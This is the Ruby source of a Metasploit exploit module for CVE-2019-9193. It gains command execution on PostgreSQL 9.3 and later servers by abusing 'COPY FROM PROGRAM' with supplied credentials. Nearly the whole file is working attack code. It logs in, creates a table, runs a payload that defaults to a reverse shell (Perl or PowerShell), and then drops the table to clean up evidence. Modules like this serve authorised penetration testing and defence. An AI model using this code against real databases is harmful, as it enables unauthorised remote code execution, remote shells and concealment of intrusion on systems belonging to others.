# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core/exploit/postgres&#039;

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Postgres
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039; => &#039;PostgreSQL COPY FROM PROGRAM Command Execution&#039;,
      &#039;Description&#039; => %q(
        Installations running Postgres 9.3 and above have functionality which allows for the superuser
        and users with &#039;pg_execute_server_program&#039; to pipe to and from an external program using COPY.
        This allows arbitrary command execution as though you have console access.

        This module attempts to create a new table, then execute system commands in the context of
        copying the command output into the table.

        This module should work on all Postgres systems running version 9.3 and above.

        For Linux & OSX systems, target 1 is used with cmd payloads such as: cmd/unix/reverse_perl

        For Windows Systems, target 2 is used with powershell payloads such as: cmd/windows/powershell_reverse_tcp
        or other customised command.
      ),
      &#039;Author&#039; => [
        &#039;Jacob Wilkin&#039; # Exploit Author of Module
      ],
      &#039;License&#039; => MSF_LICENSE,
      &#039;References&#039; => [
        [&#039;CVE&#039;, &#039;2019-9193&#039;],
        [&#039;URL&#039;, &#039;https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5&#039;],
        [&#039;URL&#039;, &#039;https://www.postgresql.org/docs/9.3/release-9-3.html&#039;] #Patch notes adding the function, see &#039;E.26.3.3. Queries - Add support for piping COPY and psql \copy data to/from an external program (Etsuro Fujita)&#039;
      ],
      &#039;PayloadType&#039; => &#039;cmd&#039;,
      &#039;Platform&#039; => %w(linux unix win osx),
      &#039;Payload&#039; => {
      },
      &#039;Arch&#039; => [ARCH_CMD],
      &#039;Targets&#039;        =>
        [
          [
            &#039;Unix/OSX/Linux&#039;, {
              &#039;Platform&#039; => &#039;unix&#039;,
              &#039;Arch&#039; => ARCH_CMD,
              &#039;DefaultOptions&#039; => {
                &#039;Payload&#039; => &#039;cmd/unix/reverse_perl&#039; }
              }
          ],[
            &#039;Windows - PowerShell (In-Memory)&#039;, {
              &#039;Platform&#039; => &#039;windows&#039;,
              &#039;Arch&#039; => ARCH_CMD,
              &#039;DefaultOptions&#039; => {
                &#039;Payload&#039; => &#039;cmd/windows/powershell_reverse_tcp&#039; }
              }
          ],[
            &#039;Windows (CMD)&#039;,
            &#039;Platform&#039;   => &#039;win&#039;,
            &#039;Arch&#039;       => [ARCH_CMD],
            &#039;Payload&#039; => {
              &#039;Compat&#039;     => {
                &#039;PayloadType&#039; => &#039;cmd&#039;,
                &#039;RequiredCmd&#039; => &#039;adduser, generic&#039;
              }
            }
          ],
        ],
      &#039;DisclosureDate&#039; => &#039;Mar 20 2019&#039;
    ))

    register_options([
      Opt::RPORT(5432),
      OptString.new(&#039;TABLENAME&#039;, [ true, &#039;A table name that does not exist (To avoid deletion)&#039;, Rex::Text.rand_text_alphanumeric(8..12)]),
      OptBool.new(&#039;DUMP_TABLE_OUTPUT&#039;, [false, &#039;select payload command output from table (For Debugging)&#039;, false])
      ])

    deregister_options(&#039;SQL&#039;, &#039;RETURN_ROWSET&#039;, &#039;VERBOSE&#039;)
  end

  # Return the datastore value of the same name
  # @return [String] tablename for table to use with command execution
  def tablename
    datastore[&#039;TABLENAME&#039;]
  end

  def check
    vuln_version? ? CheckCode::Appears : CheckCode::Safe
  end

  def vuln_version?
    version = postgres_fingerprint
    return false unless version[:auth]
    vprint_status version[:auth].to_s
    version_full = version[:auth].to_s.scan(/^PostgreSQL ([\d\.]+)/).flatten.first
    if Gem::Version.new(version_full) >= Gem::Version.new(&#039;9.3&#039;)
      return true
    else
      return false
    end
  end

  def login_success?
    status = do_login(username, password, database)
    case status
    when :noauth
      print_error "#{peer} - Authentication failed"
      return false
    when :noconn
      print_error "#{peer} - Connection failed"
      return false
    else
      print_status "#{peer} - #{status}"
      return true
    end
  end

  def execute_payload
    # Drop table if it exists
    query = "DROP TABLE IF EXISTS #{tablename};"
    drop_query = postgres_query(query)
    case drop_query.keys[0]
    when :conn_error
      print_error "#{peer} - Connection error"
      return false
    when :sql_error
      print_warning "#{peer} - Unable to execute query: #{query}"
      return false
    when :complete
      print_good "#{peer} - #{tablename} dropped successfully"
    else
      print_error "#{peer} - Unknown"
      return false
    end

    # Create Table
    query = "CREATE TABLE #{tablename}(filename text);"
    create_query = postgres_query(query)
    case create_query.keys[0]
    when :conn_error
      print_error "#{peer} - Connection error"
      return false
    when :sql_error
      print_warning "#{peer} - Unable to execute query: #{query}"
      return false
    when :complete
      print_good "#{peer} - #{tablename} created successfully"
    else
      print_error "#{peer} - Unknown"
      return false
    end

    # Copy Command into Table
    cmd_filtered = payload.encoded.gsub("&#039;", "&#039;&#039;")
    query = "COPY #{tablename} FROM PROGRAM &#039;#{cmd_filtered}&#039;;"
    copy_query = postgres_query(query)
    case copy_query.keys[0]
    when :conn_error
      print_error "#{peer} - Connection error"
      return false
    when :sql_error
      print_warning "#{peer} - Unable to execute query: #{query}"
      if copy_query[:sql_error] =~ /must be superuser to COPY to or from an external program/
        print_error &#039;Insufficient permissions, User must be superuser or in pg_read_server_files group&#039;
        return false
      end
      print_warning "#{peer} - Unable to execute query: #{query}"
      return false
    when :complete
      print_good "#{peer} - #{tablename} copied successfully(valid syntax/command)"
    else
      print_error "#{peer} - Unknown"
      return false
    end

    if datastore[&#039;DUMP_TABLE_OUTPUT&#039;]
    # Select output from table for debugging
      query = "SELECT * FROM #{tablename};"
      select_query = postgres_query(query)
      case select_query.keys[0]
      when :conn_error
        print_error "#{peer} - Connection error"
        return false
      when :sql_error
        print_warning "#{peer} - Unable to execute query: #{query}"
        return false
      when :complete
        print_good "#{peer} - #{tablename} contents:\n#{select_query}"
        return true
      else
        print_error "#{peer} - Unknown"
        return false
      end
    end
    # Clean up table evidence
    query = "DROP TABLE IF EXISTS #{tablename};"
    drop_query = postgres_query(query)
    case drop_query.keys[0]
    when :conn_error
      print_error "#{peer} - Connection error"
      return false
    when :sql_error
      print_warning "#{peer} - Unable to execute query: #{query}"
      return false
    when :complete
      print_good "#{peer} - #{tablename} dropped successfully(Cleaned)"
    else
      print_error "#{peer} - Unknown"
      return false
    end
  end

  def do_login(user, pass, database)
    begin
      password = pass || postgres_password
      result = postgres_fingerprint(
        db: database,
        username: user,
        password: password
      )

      return result[:auth] if result[:auth]
      print_error "#{peer} - Login failed"
      return :noauth

    rescue Rex::ConnectionError
      return :noconn
    end
  end

  def exploit
    #vuln_version doesn&#039;t seem to work
    #return unless vuln_version?
    return unless login_success?
    print_status("Exploiting...")
    if execute_payload
      print_status("Exploit Succeeded")
    else
      print_error("Exploit Failed")
    end
    postgres_logout if @postgres_conn
  end
end

